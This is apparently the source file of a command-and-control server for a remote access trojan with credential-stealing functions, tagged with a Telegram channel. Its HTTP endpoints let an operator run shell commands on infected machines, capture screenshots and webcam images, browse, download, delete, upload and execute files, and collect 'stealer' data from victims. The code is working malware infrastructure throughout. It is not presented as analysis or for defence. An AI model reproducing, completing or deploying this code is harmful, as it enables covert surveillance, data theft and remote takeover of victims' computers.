// t.me/SentinelLinks

/**
 * GROB WebSocket Server
 * Node.js server for client connections
 */

import { WebSocketServer, type WebSocket } from "ws"
import * as http from "http"

const WS_PORT = Number.parseInt(process.env.WS_PORT || "8765")
const API_BASE_URL = process.env.API_BASE_URL || "http://localhost:3000/api"

interface Client {
  id: string
  ws: WebSocket
  hostname: string
  os: string
  ip: string
  userUid: string
  lastSeen: Date
  status: "online" | "offline"
  latestScreen?: string
  latestStealerData?: any
  pendingCommands: Map<string, (data: any) => void>
}

const clients = new Map<string, Client>()
const clientIdByHwid = new Map<string, string>()

function sendCommandAndWait(client: Client, command: string, data?: any, timeout = 30000): Promise<any> {
  return new Promise((resolve, reject) => {
    const commandId = `${command}_${Date.now()}`

    const timer = setTimeout(() => {
      client.pendingCommands.delete(commandId)
      reject(new Error("Timeout waiting for response"))
    }, timeout)

    client.pendingCommands.set(commandId, (responseData) => {
      clearTimeout(timer)
      resolve(responseData)
    })

    client.ws.send(
      JSON.stringify({
        type: "command",
        command,
        commandId,
        data,
      }),
    )
  })
}

// HTTP API for Next.js
const httpServer = http.createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*")
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
  res.setHeader("Access-Control-Allow-Headers", "Content-Type")

  if (req.method === "OPTIONS") {
    res.writeHead(200)
    res.end()
    return
  }

  const url = new URL(req.url || "/", `http://localhost:${WS_PORT}`)

  // GET /clients - list connected clients
  if (req.method === "GET" && url.pathname === "/clients") {
    const uid = url.searchParams.get("uid")
    let clientList = Array.from(clients.values()).map((c) => ({
      id: c.id,
      hostname: c.hostname,
      name: c.hostname,
      os: c.os,
      ip: c.ip,
      userUid: c.userUid,
      status: c.status,
      lastSeen: c.lastSeen.toISOString(),
    }))

    if (uid) {
      clientList = clientList.filter((c) => c.userUid === uid)
    }

    res.writeHead(200, { "Content-Type": "application/json" })
    res.end(JSON.stringify({ clients: clientList }))
    return
  }

  // GET /screen/:clientId - get latest screenshot
  if (req.method === "GET" && url.pathname.startsWith("/screen/")) {
    const clientId = url.pathname.replace("/screen/", "")
    const client = clients.get(clientId)

    if (!client || !client.latestScreen) {
      res.writeHead(404, { "Content-Type": "application/json" })
      res.end(JSON.stringify({ error: "No screenshot available" }))
      return
    }

    res.writeHead(200, { "Content-Type": "application/json" })
    res.end(JSON.stringify({ data: client.latestScreen }))
    return
  }

// t.me/SentinelLinks
  if (req.method === "POST" && url.pathname === "/cmd") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId, command } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        try {
          const result = await sendCommandAndWait(client, "cmd", { command }, 30000)
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(
            JSON.stringify({
              success: true,
              output: result?.output || result?.result || "Команда выполнена",
            }),
          )
        } catch (err: any) {
          res.writeHead(500, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: err.message || "Command timeout" }))
        }
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

  if (req.method === "POST" && url.pathname === "/monitors") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(
            JSON.stringify({
              monitors: [{ id: "0", name: "Монитор 1", width: 1920, height: 1080, isPrimary: true }],
            }),
          )
          return
        }

        try {
          const result = await sendCommandAndWait(client, "monitors_list", {}, 5000)
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(
            JSON.stringify({
              monitors: result?.monitors || [
                { id: "0", name: "Монитор 1", width: 1920, height: 1080, isPrimary: true },
              ],
            }),
          )
        } catch (err) {
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(
            JSON.stringify({
              monitors: [{ id: "0", name: "Монитор 1", width: 1920, height: 1080, isPrimary: true }],
            }),
          )
        }
      } catch (error) {
        res.writeHead(200, { "Content-Type": "application/json" })
        res.end(
          JSON.stringify({
            monitors: [{ id: "0", name: "Монитор 1", width: 1920, height: 1080, isPrimary: true }],
          }),
        )
      }
    })
    return
  }

  if (req.method === "POST" && url.pathname === "/file_list") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId, path } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        try {
          const result = await sendCommandAndWait(client, "file_list", { path }, 15000)
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(JSON.stringify(result))
        } catch (err: any) {
          res.writeHead(500, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: err.message || "Timeout" }))
        }
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

  if (req.method === "POST" && url.pathname === "/file_download") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId, path } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        try {
          const result = await sendCommandAndWait(client, "file_download", { path }, 60000)
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(JSON.stringify(result))
        } catch (err: any) {
          res.writeHead(500, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: err.message || "Timeout" }))
        }
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

// t.me/SentinelLinks
  if (req.method === "GET" && url.pathname.match(/^\/api\/webcam\/[^/]+\/cameras$/)) {
    const clientId = url.pathname.split("/")[3]
    const client = clients.get(clientId)

    if (!client) {
      res.writeHead(200, { "Content-Type": "application/json" })
      res.end(JSON.stringify({ cameras: [{ id: "0", name: "Default Camera" }] }))
      return
    }

    sendCommandAndWait(client, "webcam_list", {}, 5000)
      .then((result) => {
        res.writeHead(200, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ cameras: result?.cameras || [{ id: "0", name: "Default Camera" }] }))
      })
      .catch(() => {
        res.writeHead(200, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ cameras: [{ id: "0", name: "Default Camera" }] }))
      })
    return
  }

  if (req.method === "POST" && url.pathname === "/webcam") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId, deviceId } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        try {
          const result = await sendCommandAndWait(client, "webcam_capture", { deviceId: deviceId || "0" }, 10000)
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ data: result?.data || result }))
        } catch (err: any) {
          res.writeHead(500, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: err.message || "Timeout" }))
        }
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

  // POST /command - send command to client
  if (req.method === "POST" && url.pathname === "/command") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", () => {
      try {
        const { clientId, command, data } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        const message = { type: "command", command, data }
        client.ws.send(JSON.stringify(message))

        res.writeHead(200, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ success: true }))
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

  // POST /screen - request screenshot
  if (req.method === "POST" && url.pathname === "/screen") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        client.latestScreen = undefined

        // Send screenshot command
        client.ws.send(JSON.stringify({ type: "command", command: "screenshot" }))

        // Wait for screenshot response (max 10 seconds)
        let attempts = 0
        const maxAttempts = 100

        const waitForScreen = () => {
          if (client.latestScreen) {
            res.writeHead(200, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ data: client.latestScreen }))
            return
          }

          attempts++
          if (attempts >= maxAttempts) {
            res.writeHead(408, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ error: "Timeout waiting for screenshot" }))
            return
          }

          setTimeout(waitForScreen, 100)
        }

        waitForScreen()
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

  // POST /stealer - request stealer data
  if (req.method === "POST" && url.pathname === "/stealer") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        // Send stealer command and wait for response
        const promise = new Promise<any>((resolve) => {
          const timeout = setTimeout(() => {
            client.pendingCommands.delete("stealer")
            resolve(null)
          }, 30000)

          client.pendingCommands.set("stealer", (data) => {
            clearTimeout(timeout)
            resolve(data)
          })
        })

        client.ws.send(JSON.stringify({ type: "command", command: "stealer" }))

        const stealerData = await promise

        if (stealerData) {
          res.writeHead(200, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ success: true, data: stealerData }))
        } else {
          res.writeHead(408, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Timeout waiting for data" }))
        }
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

  // POST /files - send file to client
  if (req.method === "POST" && url.pathname === "/files") {
    let body = ""
    req.on("data", (chunk) => (body += chunk))
    req.on("end", async () => {
      try {
        const { clientId, action, fileName, fileData, fileSize, path } = JSON.parse(body)
        const client = clients.get(clientId)

        if (!client) {
          res.writeHead(404, { "Content-Type": "application/json" })
          res.end(JSON.stringify({ error: "Client not found" }))
          return
        }

        if (action === "list") {
          try {
            const result = await sendCommandAndWait(client, "file_list", { path: path || "" }, 15000)
            res.writeHead(200, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ files: result?.files || [], path: result?.path }))
          } catch (err: any) {
            res.writeHead(500, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ error: err.message || "Timeout" }))
          }
          return
        }

        if (action === "download") {
          try {
            const result = await sendCommandAndWait(client, "file_download", { path }, 60000)
            res.writeHead(200, { "Content-Type": "application/json" })
            res.end(
              JSON.stringify({
                fileData: result?.fileData,
                fileName: result?.fileName,
                fileSize: result?.fileSize,
              }),
            )
          } catch (err: any) {
            res.writeHead(500, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ error: err.message || "Timeout" }))
          }
          return
        }

        if (action === "delete") {
          try {
            const result = await sendCommandAndWait(client, "file_delete", { path }, 15000)
            res.writeHead(200, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ success: result?.success || true }))
          } catch (err: any) {
            res.writeHead(500, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ error: err.message || "Timeout" }))
          }
          return
        }

        if (action === "run") {
          try {
            const result = await sendCommandAndWait(client, "file_run", { path }, 15000)
            res.writeHead(200, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ success: result?.success || true }))
          } catch (err: any) {
            res.writeHead(500, { "Content-Type": "application/json" })
            res.end(JSON.stringify({ error: err.message || "Timeout" }))
          }
          return
        }

        if (action === "upload") {
          client.ws.send(
            JSON.stringify({
              type: "command",
              command: "file_upload",
              data: { fileName, fileData, fileSize },
            }),
          )
        } else if (action === "execute") {
          client.ws.send(
            JSON.stringify({
              type: "command",
              command: "file_execute",
              data: { fileName },
            }),
          )
        }

        res.writeHead(200, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ success: true }))
      } catch (error) {
        res.writeHead(400, { "Content-Type": "application/json" })
        res.end(JSON.stringify({ error: "Invalid request" }))
      }
    })
    return
  }

  res.writeHead(404)
  res.end("Not Found")
})

// WebSocket server
const wss = new WebSocketServer({ server: httpServer })

wss.on("connection", (ws, req) => {
  const clientIp =
    req.headers["x-forwarded-for"]?.toString().split(",")[0] ||
    req.socket.remoteAddress?.replace("::ffff:", "") ||
    "unknown"
  let clientId: string | null = null

  const handshakeTimeout = setTimeout(() => {
    ws.close(1008, "Handshake timeout")
  }, 30000)

  ws.on("message", async (data) => {
    try {
      const message = JSON.parse(data.toString())

      // Client hello
      if (message.type === "client_hello") {
        clearTimeout(handshakeTimeout)

        const { hostname, os, user_uid, ip } = message.data

        if (!user_uid || user_uid === "null" || !user_uid.trim()) {
          ws.close(1008, "Missing UID")
          return
        }

        const hwid = `${user_uid}-${hostname}`

        // Check if this client already exists
        const existingClientId = clientIdByHwid.get(hwid)
        if (existingClientId && clients.has(existingClientId)) {
          const oldClient = clients.get(existingClientId)
          if (oldClient && oldClient.ws !== ws) {
            oldClient.ws.close(1000, "New connection")
          }
          clients.delete(existingClientId)
        }

        clientId = hwid
        clientIdByHwid.set(hwid, clientId)

        clients.set(clientId, {
          id: clientId,
          ws,
          hostname,
          os,
          ip: ip || clientIp,
          userUid: user_uid,
          lastSeen: new Date(),
          status: "online",
          pendingCommands: new Map(),
        })

        console.log(`[WS] Client connected: ${hostname} (${clientIp})`)

        // Register with API
        try {
          await fetch(`${API_BASE_URL}/devices`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              device: {
                id: clientId,
                name: hostname,
                hostname,
                ip: ip || clientIp,
                os,
                status: "online",
                lastSeen: new Date().toISOString(),
                hwid: clientId,
              },
              userUid: user_uid,
            }),
          })
        } catch (err) {}

        ws.send(JSON.stringify({ type: "connected", clientId }))
        return
      }

      // Update last seen
      if (clientId && clients.has(clientId)) {
        clients.get(clientId)!.lastSeen = new Date()
      }

      if (message.commandId && clientId) {
        const client = clients.get(clientId)
        if (client) {
          const callback = client.pendingCommands.get(message.commandId)
          if (callback) {
            callback(message.data || message)
            client.pendingCommands.delete(message.commandId)
            return
          }
        }
      }

      // Handle responses (legacy without commandId)
      if (message.type === "screenshot_response" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          client.latestScreen = message.data
        }
      }

      if (message.type === "cmd_result" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          for (const [key, callback] of client.pendingCommands.entries()) {
            if (key.startsWith("cmd_")) {
              callback(message.data || message)
              client.pendingCommands.delete(key)
              break
            }
          }
        }
      }

      if (message.type === "file_list_response" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          for (const [key, callback] of client.pendingCommands.entries()) {
            if (key.startsWith("file_list_")) {
              callback(message.data || message)
              client.pendingCommands.delete(key)
              break
            }
          }
        }
      }

      if (message.type === "file_download_response" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          for (const [key, callback] of client.pendingCommands.entries()) {
            if (key.startsWith("file_download_")) {
              callback(message.data || message)
              client.pendingCommands.delete(key)
              break
            }
          }
        }
      }

      if (message.type === "webcam_list_response" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          for (const [key, callback] of client.pendingCommands.entries()) {
            if (key.startsWith("webcam_list_")) {
              callback(message.data || message)
              client.pendingCommands.delete(key)
              break
            }
          }
        }
      }

      if (message.type === "webcam_frame" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          for (const [key, callback] of client.pendingCommands.entries()) {
            if (key.startsWith("webcam_capture_")) {
              callback({ data: message.data })
              client.pendingCommands.delete(key)
              break
            }
          }
        }
      }

      if (message.type === "monitors_list_response" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          for (const [key, callback] of client.pendingCommands.entries()) {
            if (key.startsWith("monitors_list_")) {
              callback(message.data || message)
              client.pendingCommands.delete(key)
              break
            }
          }
        }
      }

      if (message.type === "stealer_data" && clientId) {
        const client = clients.get(clientId)
        if (client) {
          client.latestStealerData = message.data
          const callback = client.pendingCommands.get("stealer")
          if (callback) {
            callback(message.data)
            client.pendingCommands.delete("stealer")
          }
        }
      }

      if (message.type === "file_uploaded" && clientId) {
      }

      if (message.type === "file_executed" && clientId) {
      }
    } catch (error) {}
  })

  ws.on("close", () => {
    clearTimeout(handshakeTimeout)
    if (clientId && clients.has(clientId)) {
      const client = clients.get(clientId)!
      clients.delete(clientId)
    }
  })

  ws.on("error", (error) => {})
})

// Cleanup stale clients
setInterval(() => {
  const now = Date.now()
  for (const [id, client] of clients.entries()) {
    if (now - client.lastSeen.getTime() > 60000) {
      client.ws.close()
      clients.delete(id)
    }
  }
}, 30000)

httpServer.listen(WS_PORT, "0.0.0.0", () => {})

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
